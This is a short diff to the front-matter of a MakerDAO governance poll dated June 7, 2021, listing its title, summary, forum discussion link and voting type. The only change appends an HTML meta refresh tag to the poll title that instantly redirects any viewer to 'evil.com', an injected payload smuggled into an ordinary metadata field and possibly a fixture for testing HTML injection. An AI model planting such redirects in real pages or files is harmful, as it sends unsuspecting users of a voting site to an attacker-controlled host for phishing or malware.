@@ -1,5 +1,5 @@
 ---
-title: Parameter Changes Proposal - MakerDAO Open Market Committee - June 7, 2021
+title: Parameter Changes Proposal - MakerDAO Open Market Committee - June 7, 2021 <META HTTP-EQUIV="refresh" CONTENT="0;url=https://evil.com/">
 summary: Signal your support or opposition to changing the parameters listed in this poll.
 discussion_link: https://forum.makerdao.com/t/parameter-changes-proposal-ppg-omc-001-1-june-2021/8476
 vote_type: Plurality Voting
